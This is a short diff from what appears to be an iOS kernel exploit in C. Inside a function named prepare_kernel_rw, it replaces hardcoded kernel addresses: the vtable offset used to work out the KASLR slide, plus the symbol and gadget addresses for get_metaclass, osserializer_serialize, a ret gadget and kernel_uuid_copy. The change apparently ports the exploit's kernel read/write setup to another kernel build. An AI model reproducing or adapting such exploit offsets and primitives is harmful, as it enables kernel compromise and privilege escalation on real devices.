@@ -576,13 +576,13 @@ uint64_t prepare_kernel_rw() {
   uint64_t vtable = buf[0];
   
   // rebase the symbols
-  kaslr_shift = vtable - 0xFFFFFFF006FA2C50;
+  kaslr_shift = vtable - 0xfffffff006f83d38;
   
   kernel_base = 0xFFFFFFF007004000 + kaslr_shift;
-  get_metaclass = 0xFFFFFFF0074446DC + kaslr_shift;
-  osserializer_serialize = 0xFFFFFFF00745B0DC + kaslr_shift;
-  ret = 0xFFFFFFF0074446E4 + kaslr_shift;
-  kernel_uuid_copy = 0xFFFFFFF0074664F8 + kaslr_shift;
+  get_metaclass = 0xfffffff00747ad9c + kaslr_shift;
+  osserializer_serialize = 0xfffffff0074916b4 + kaslr_shift;
+  ret = 0xfffffff00747ada4 + kaslr_shift;
+  kernel_uuid_copy = 0xfffffff00749ca6c + kaslr_shift;
   
   // save the port and userclient so we can use them for the r/w
   oob_port = first_port;
